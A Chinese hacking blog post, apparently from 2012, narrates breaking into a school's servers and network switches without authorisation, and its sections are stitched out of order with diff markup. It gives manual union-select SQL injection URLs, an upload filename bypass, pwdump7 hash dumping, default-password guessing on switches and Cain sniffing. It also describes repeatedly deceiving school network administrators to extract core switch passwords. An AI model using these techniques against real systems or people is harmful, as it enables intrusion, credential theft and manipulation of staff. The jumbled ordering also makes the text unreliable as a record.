&lt;p&gt;好了，收集差不多就动工，首先这台服务器是从80端口突破的，当然还有另一台。测试下ping其他段的机器，因为是寒假期间，所以我会选择ping交换机，经过朋友的收集情况，每天早上 6:50 到 中午 11:50 会开启&lt;/p&gt;  &lt;p&gt;下午14:15 到 下午 16:55 会开启&lt;/p&gt;  &lt;p&gt;晚上 18:10 到 晚上 21:30 会开启&lt;/p&gt;  &lt;p&gt;好了,大致也了解到 交换机的启动时间 资料, 首先不知道本机出于哪个网段,是不是最高毫无妨碍呢?! 非常好, 因为当时我参观的时候 网管就是坐在 这台服务器上工作的, 朋友说平时老师上课时候要用到连接外网工作,都是由这台服务器去操作的, 所以简单来说这台是能ping通整个校园网络的! 我的现正处于的网段就是：192.168.8.1-255。 如图, 我以我朋友的教室为案例,以及隔壁班的一起：&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image054.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image054&quot; border=&quot;0&quot; alt=&quot;clip_image054&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image054_thumb.jpg&quot; width=&quot;574&quot; height=&quot;220&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image056.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image056&quot; border=&quot;0&quot; alt=&quot;clip_image056&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image056_thumb.jpg&quot; width=&quot;504&quot; height=&quot;404&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;好了，测试通过，证明这是对的，他的机器是装有瑞星套装，如果到处都ping不通，尝试下关掉防火墙。&lt;/p&gt;  &lt;p&gt;当然，我们现在的目的是取得交互机的权限，使得教室网络解除acl限制&lt;/p&gt;  &lt;p&gt;首先收集下本段的机器有哪些是存活的，当时我在嗅探，所以直接在cain下就能看到！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image058.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image058&quot; border=&quot;0&quot; alt=&quot;clip_image058&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image058_thumb.jpg&quot; width=&quot;281&quot; height=&quot;108&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;而且之前我cain的时候不只这些机器，还有其他几台&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image060.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image060&quot; border=&quot;0&quot; alt=&quot;clip_image060&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image060_thumb.jpg&quot; width=&quot;195&quot; height=&quot;160&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;可能处于某些原因，寒假关闭了。经过一番&lt;a href=&quot;http://ha.cker.in/tag/嗅探&quot; target=&quot;_blank&quot;&gt;嗅探&lt;/a&gt;，我获得了同网段下的 192.168.8.252 这台服务器，这台是对外开放，所以成功搞下了！ 有些人问，我的目的只是想弄到交换机的权限，为啥还有搞这么多工作呢？！ 我告诉你，知己知彼才能百战百胜，因为出于交换机要使用特权模式，而且我暂时没有射到密码，所以必须弄多几台机器，导出系统的hash，再凑合几个密码来。&lt;/p&gt;  &lt;p&gt;好了，我们来登录另一台机器看下有啥遗留下来的有用的信息！因为这台就是内网，不用再用肉鸡反弹了！手贱的情况下，还是按了5下shift ，弹出 窗口， 不解释了， 是之前的X者遗留下来的后门，当时已经添加了用户，别理了。到时候直接删除就行了！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image062.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image062&quot; border=&quot;0&quot; alt=&quot;clip_image062&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image062_thumb.jpg&quot; width=&quot;574&quot; height=&quot;399&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;提权也很简单，拿shell也很简单，不多说了！&lt;/p&gt;  &lt;p&gt;上传wce时候，发现不能使用，导出注册表的时候用cain也不能，于是搜索了下还有什么神器能用， pwdump7 ，这个使用非常简单，pwdump7.exe 1&amp;gt;1.txt 意思是把全部hash导出到文件根目录的1.txt 里面， 然后直接到站里破就可以了，如果有彩虹表的直接跑咯，一台跑出了&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image064.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image064&quot; border=&quot;0&quot; alt=&quot;clip_image064&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image064_thumb.jpg&quot; width=&quot;482&quot; height=&quot;42&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;另一台跑出的是 &lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image066.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image066&quot; border=&quot;0&quot; alt=&quot;clip_image066&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image066_thumb.jpg&quot; width=&quot;509&quot; height=&quot;50&quot; /&gt;&lt;/a&gt; administrator为不知道，导出有问题。那些账号密码一样的是我自己的号。然后开些轻型级的武器，扫描整个段，为啥不扫其他段呢？！ 1、这个段服务器段 2、其他段的机器也关了。好吧，配置下htscan 直接扫了。暂时未发现弱机器。好了，我们下一步，社工存活的服务器。 各种密码，各种配合 一起来搞……..几分钟过去射不出，可能那些服务器不是由同一个网管打理的吧。不理了，如果有需要的话我会直接利用漏洞导致整个校园来种马。Arp你们都会的。 telnet 192.168.27.1 这个是我朋友的教室网关，也就是交换机了。&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image068.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image068&quot; border=&quot;0&quot; alt=&quot;clip_image068&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image068_thumb.jpg&quot; width=&quot;310&quot; height=&quot;182&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;成功。进行输入账号密码阶段。一般来说我们习惯性都是由简单到复杂来猜测的！&lt;/p&gt;  &lt;p&gt;Admin admin 你们懂得！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image070.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image070&quot; border=&quot;0&quot; alt=&quot;clip_image070&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image070_thumb.jpg&quot; width=&quot;316&quot; height=&quot;175&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;这是交换机的用户模式。现在我们要想办法进入特权模式，以备开启教室网络的重要操作。&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image072.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image072&quot; border=&quot;0&quot; alt=&quot;clip_image072&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image072_thumb.jpg&quot; width=&quot;108&quot; height=&quot;152&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;尝试完这一批之后，失败了，重新组合密码吧，孩纸，我想也没那么简单就让你这垃圾通过的！经过差不多30分钟的猜测，进去了！我的神。只有目的达到，为求不咋手段、&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image074.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image074&quot; border=&quot;0&quot; alt=&quot;clip_image074&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image074_thumb.jpg&quot; width=&quot;249&quot; height=&quot;214&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;之后的什么全局配置模式 都是浮云了。目的达到。之后测试了其他的路由器都是统一密码。这个两层验证什么的都是傻逼，第一层都是默认，进而获得第二层密码，然而进入特权模式，之后的什么命令都能执行了，重新划分vlan等都可以实现，如果不懂交换机的朋友可以自己找资料看下！突然我发现貌似这只是二层交换机，还有三层和核心交换机，怎么怎么，现在才想到还有这些，因为大半夜，突然那个网管回话了··我擦，神马人啊，于是我就找到朋友，连夜叫醒他收集资料以及拿着手上的裤做对比，于是足足跟那个管理聊了1个半小时多，终于搞定了！看过程：&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image076.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image076&quot; border=&quot;0&quot; alt=&quot;clip_image076&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image076_thumb.jpg&quot; width=&quot;303&quot; height=&quot;221&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image077.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image077&quot; border=&quot;0&quot; alt=&quot;clip_image077&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image077_thumb.jpg&quot; width=&quot;286&quot; height=&quot;106&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;主要是利用你手头的信息，跟他一直聊天，小心露出破绽，关注他有关工作的信息，他说辞工了，好了，然后我就说我要了解几个交换机的信息，然后诱发他的欲望，而且你要装得很想学习，然后他就来了&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image079.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image079&quot; border=&quot;0&quot; alt=&quot;clip_image079&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image079_thumb.jpg&quot; width=&quot;200&quot; height=&quot;210&quot; /&gt;&lt;/a&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image080.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image080&quot; border=&quot;0&quot; alt=&quot;clip_image080&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image080_thumb.jpg&quot; width=&quot;266&quot; height=&quot;161&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;然后就慢慢诱惑他，逼使他说出交换机什么牌子，有助于了解配置命令，然后就是机会来了！看上图，他啥都告诉我了！&lt;/p&gt;  &lt;p&gt;0x07&lt;/p&gt;  &lt;p&gt;折腾后的社工&lt;/p&gt;  &lt;p&gt;继上次折腾后，不小心清除了核心交换机的特权密码，因为急着设置回去，又不小心清除了telnet后的账号密码，然后去了下WC就忘记加上密码就退出了。因为新的学期，根据社工前网管，得知他不干了，然后又来了个新网管，貌似他对于交换机的实操都是一知半解的，OH YEAH！ 然后就重新社工过吧。&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image082.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image082&quot; border=&quot;0&quot; alt=&quot;clip_image082&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image082_thumb.jpg&quot; width=&quot;573&quot; height=&quot;414&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;在搜索引擎中，我并没有找到什么可用的资料，就只有常用账号了，只找到两个站上有他的资料，一个是贴吧，一个是什么关于QQ的论坛。没裤。然后只能加上好友，跟他聊天了，起码我知道他是那间学校毕业的，有他们学校的学生资料就行了，他的母校也正是贵校，好了，未必用裤才能完成社工，本段正是没裤的社工了。我知他技术不太行，所以为社工带来了很多方便。&lt;/p&gt;  &lt;p&gt;因为上次我清楚了核心交换机的密码，所以导致密码为空，不能远程登录，让我觉得我手真的好贱，正好我也借此机会跟他扯上了关系。平时不懂的，直接让他问我，我找到了饭客的思科路由教程给他看，他就慢慢信任我了，当时因为他telnet不上，所以我就教他怎么修复，说修复了，让他告诉我过程，他就写了。他是装成某班的一名学生，当时说我教他修复了，让他告诉我核心交换机密码，然后让我上去耍的，他妹的，居然出尔反尔，当时气死了&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image084.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image084&quot; border=&quot;0&quot; alt=&quot;clip_image084&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image084_thumb.jpg&quot; width=&quot;228&quot; height=&quot;340&quot; /&gt;&lt;/a&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image086.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image086&quot; border=&quot;0&quot; alt=&quot;clip_image086&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image086_thumb.jpg&quot; width=&quot;302&quot; height=&quot;311&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image088.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image088&quot; border=&quot;0&quot; alt=&quot;clip_image088&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image088_thumb.jpg&quot; width=&quot;329&quot; height=&quot;202&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;然后我就冷静了下，因为社工还只是刚刚开始，我大概也能猜到，没理由这么顺心的了，但是前几天确实是这个密码，因为当时没时间，就闪人了。&lt;/p&gt;  &lt;p&gt;之后我想办法继续射他，怎么不嗅探呢？！ 以为服务器在 xxx.xxx.8.xxx 网段，他的在其他网段，而且我也不知道他PC的段，他说过只会在机房做实验，所以放下了嗅探这个办法。然后呢，他那煞笔，居然不知道自己是内外网</code>内网就让他登录我的肉鸡,然后转发登录内网,外网就直接发工具,让他本地转发,目的还是一样。其实我想他登录学校的服务器,他用administrator 登录,我用自己的账号登录,然后本地嗅探,突然发觉我好贱啊,看下图</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image090.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image090" border="0" alt="clip_image090" src="http://img.cker.in/df99b5f14772_C386/clip_image090_thumb.jpg" width="242" height="300"></a><a href="http://img.cker.in/df99b5f14772_C386/clip_image092.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image092" border="0" alt="clip_image092" src="http://img.cker.in/df99b5f14772_C386/clip_image092_thumb.jpg" width="251" height="340"></a></p>  <p>他这个煞笔，居然服务器密码都忘记了，当然我好人，当时抓了hash，破解了，帮他打上了，然后他就</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image093.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image093" border="0" alt="clip_image093" src="http://img.cker.in/df99b5f14772_C386/clip_image093_thumb.jpg" width="503" height="340"></a></p>  <p>NND，就看了下是不是真的进入了学校服务器，我蛋疼，就一直停留在这里，跟我扯，因为当时我远程看他的，所以就蛋疼了一晚上，还问我怎么学校同意我登录上去的，又让我说了一个善意的谎言。</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image095.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image095" border="0" alt="clip_image095" src="http://img.cker.in/df99b5f14772_C386/clip_image095_thumb.jpg" width="307" height="309"></a><a href="http://img.cker.in/df99b5f14772_C386/clip_image096.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image096" border="0" alt="clip_image096" src="http://img.cker.in/df99b5f14772_C386/clip_image096_thumb.jpg" width="270" height="93"></a></p>  <p>当我看见telnet这几个字的时候，我激动了。跟小胖子扯了一会，然后我就一直哄他用交换机，最后还是搞定了。</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image098.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image098" border="0" alt="clip_image098" src="http://img.cker.in/df99b5f14772_C386/clip_image098_thumb.jpg" width="311" height="703"></a><a href="http://img.cker.in/df99b5f14772_C386/clip_image100.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image100" border="0" alt="clip_image100" src="http://img.cker.in/df99b5f14772_C386/clip_image100_thumb.jpg" width="165" height="176"></a></p>  <p>当时没有截 特权模式密码的图，所以就不贴了， 嗅探时候显示有些问题，所以蛋疼了，本来想装个键盘记录的了，但是找不到好使了，所以直接嗅探了，这个贱人，让我陪了她一晚上，浪费了我的青春。多谢我亲爱的朋友配合，让我认识了贵校的领导名字 - -~~~！</p>  <p>0x08</p>  <p>总结。</p>  <p>爱渗透你会更爱<a href="http://ha.cker.in/tag/社工" target="_blank">社工</a>，爱你妹你会更爱基友！</p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2012-08-30T22:01:40.000Z" itemprop="datePublished">
-          2012-08-31
-      </time>
-    
-    
-    | 
-    <a href='/tag/C段/'>C段</a>,
-    
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/社工/'>社工</a>,
-    
-    <a href='/tag/嗅探/'>嗅探</a>
-    
-    
-</span>
-    <h1 class="post-title">友谊的 招呼 -对母校的亲密检测</h1>
-    <section class="post-content">
-      <p>我记得在校的时候某校的领导以及老师来到我们学校参观，虽然我见到对方学校的领导我会非常有礼貌的打招呼，一次回到家里的时候，出于友谊，决定为此国家重点级的学校进行友情的“招呼”！</p>  <p>国家级重点级，相对震精的学校，最近我在看《黑客与画家》，里面第一篇的内容是“为什么书呆子不受欢迎”，有段作者是说公立的学校的老师就像监狱里的狱卒，除了防止你打架做坏事之外，都不会管你！我就得说得非常好！作为国家级重点级的学校，这也是更加的！好了，不说题外话了，这篇文章是以前“招呼”的了！所以现在写下来，给大家参考下，虽然不是很好，但是各位也不要喷我吧！</p>  <p>我重申一次，我确实是个贱人</p>  <p>0x00</p>  <p>作为国家级的重点学校，我听说他的服务器是ZF给的，买了200W左右，当然我也参观过，虽然外表看不出来，我想那个网管老师也不会吹牛B吧，就是这样才出于好奇心，才弄得！</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/df99b5f14772_C386/clip_image002_thumb.jpg" width="574" height="286"></a></p>  <p>为了防止被万人骑，所以部分过滤了！</p>  <p>手握神器，开始动工！这次的“招呼”任务我会在win下进行，当然如果需要的情况下，我会使用win+linux交互渗透！</p>  <p>0x01</p>  <p>踩点。</p>  <p>作为一个国家级的重点学校，我相信安全也是非常好的！起码也是服务器独立域名，内网等吧！收集下信息，我会采用某社工神器这个软件我非常喜欢</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/df99b5f14772_C386/clip_image004_thumb.jpg" width="573" height="358"></a></p>  <p>说下他的用途吧，适用大型<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>适用</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/df99b5f14772_C386/clip_image006_thumb.jpg" width="128" height="478"></a></p>  <p>有各种信息的收集，不懂E文的朋友，可能会比较亏哦！这个工具其实已经融入了bt5系列了，呵呵，说下现在收集到的情况吧。Win03+iis6.0+内网+C段一个站，无CDN，asp+php+aspx，<a href="http://ha.cker.in/tag/C段" target="_blank">C段</a>的站是asp+aspx+win03+iis6.0+内网！招聘站一个，三台服务器的管理都是同一人，说下怎么收集的吧！首先google语法。Site:url inurl:asp|php|aspx|jsp。还有根据报错等清楚是iis，我就比较懒，火狐插件直接获得</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image008.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/df99b5f14772_C386/clip_image008_thumb.jpg" width="445" height="275"></a></p>  <p>对两台服务器进行了扫描端口与分析工作，在win下，我会选择用superscan，如果在linux下我会选择更为精准的nmap！superscan比较简单，因为在gui，直接填入IP和所需的端口就行了，如果在linux下的nmap格式就是：namp –v –a ip</p>  <p>得到的端口有：</p>  <p>21 ftp</p>  <p>80 www</p>  <p>面对以上者两个端口，可以参考的攻击思路如下：</p>  <p>21—爆破模式，或者社工，嗅探等。</p>  <p>80—iis写权限，以及脚本渗透。</p>  <p>有些人问，不是有php和aspx吗？！应该会扫描到1433和3306的啊！很简单，以为他不允许对外访问，或者内网，他就扫描不出了啊。</p>  <p>扫描了整站目录以及文件，有二级目录上的站。暂时没发现主站的后台，另一个分站是教师系统，我见过那些老师是在上面进行公告浏览以及发布什么规定的地方。</p><a id="more"></a><p></p>  <p>根据网站上留下来的QQ以及姓名的某个字</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image010.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/df99b5f14772_C386/clip_image010_thumb.jpg" width="226" height="50"></a></p>  <p>社工得到网站管理的部分资料</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image012.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/df99b5f14772_C386/clip_image012_thumb.jpg" width="312" height="307"></a></p>  <p>常用密码怎么知道的？！很简单，拿出你的裤，以及密码社工，马上得到！非常好！得到管理信息对之后非常有用！踩点差不多了！进行下一步工作吧！</p>  <p>0x02</p>  <p>战争的开始！</p>  <p>对于以上的信息，为我们的战争的做好了充分的准备，对于初期的脚本初探，对于大站我会选择安全评估工具，例如：国产的jsky，国外的wvs等，这两个大家都是非常常用，对于我来说，一般我都只用些简单的工具就行了，没什么必要都很少用。主站的是asp，因为找不到后台原因，而且还有二级目录上的站，多数都站都会疏忽二级目录上的站的安全，所以我偷笑了！</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image014.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014" border="0" alt="clip_image014" src="http://img.cker.in/df99b5f14772_C386/clip_image014_thumb.jpg" width="573" height="324"></a></p>  <p>经过google收集了下，非常多，而且我听说我那边的朋友说，他们学校以前给某师兄来过，所以安全应该会加固了很多！比较懒，老规矩，都是由软件去跑。呵呵！结果下来了<a href="http://img.cker.in/df99b5f14772_C386/clip_image016.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016" border="0" alt="clip_image016" src="http://img.cker.in/df99b5f14772_C386/clip_image016_thumb.jpg" width="573" height="385"></a></p>  <p>后台地址显示500貌似是坏了啊！如果不是坏了，就是不显示吧！反正后台页面显示正常！</p>  <p>来检测下吧，是asp搭建的系统，找个带参数的地方测试下注射漏洞吧！<a href="http://img.cker.in/df99b5f14772_C386/clip_image018.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018" border="0" alt="clip_image018" src="http://img.cker.in/df99b5f14772_C386/clip_image018_thumb.jpg" width="573" height="300"></a></p>  <p>搞注射我觉得手工比工具快，所以所以就手工来了！</p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a>’ /<em>出错</em></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> and 1=1 /正常</p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> and 1=2 /<em>出错</em></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> order by 10 /正常</p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> order by 12 /<em>出错</em></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> order by 11 /正常</p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> union select 1,2,3,4,5,6,7,8,9,10,11 from admin /<em>显示错位，这里如果不行的就换过另外一种方法一个一个字母来猜，或者换过一个表，我比较懒，所以直接联合查询了！</em></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> union select 1,password,username,4,5,6,7,8,9,10,11 from admin /貌似出错了，这里有个技巧，因为有后台，看后台源码，一些程序猿写网站系统的时候会把字段写在后台页面哪里，<a href="http://img.cker.in/df99b5f14772_C386/clip_image020.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020" border="0" alt="clip_image020" src="http://img.cker.in/df99b5f14772_C386/clip_image020_thumb.jpg" width="573" height="146"></a></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> union select 1,password,admin,4,5,6,7,8,9,10,11 from admin</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image022.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image022" border="0" alt="clip_image022" src="http://img.cker.in/df99b5f14772_C386/clip_image022_thumb.jpg" width="574" height="43"></a></p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image024.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image024" border="0" alt="clip_image024" src="http://img.cker.in/df99b5f14772_C386/clip_image024_thumb.jpg" width="574" height="156"></a></p>  <p>震精了下，居然明文，未经过任何加密！登录后台直接拿shell去了！</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image026.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image026" border="0" alt="clip_image026" src="http://img.cker.in/df99b5f14772_C386/clip_image026_thumb.jpg" width="504" height="211"></a></p>  <p>居然出错了！我记得还有个上传页面哦！<a href="http://img.cker.in/df99b5f14772_C386/clip_image028.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image028" border="0" alt="clip_image028" src="http://img.cker.in/df99b5f14772_C386/clip_image028_thumb.jpg" width="462" height="221"></a></p>  <p>根据经验这个是雷池的上传，是以get形式提交的！可以构造上传名字</p>  <p>uploadpic.asp?actiontype=mod&amp;picname=miao.asp</p>  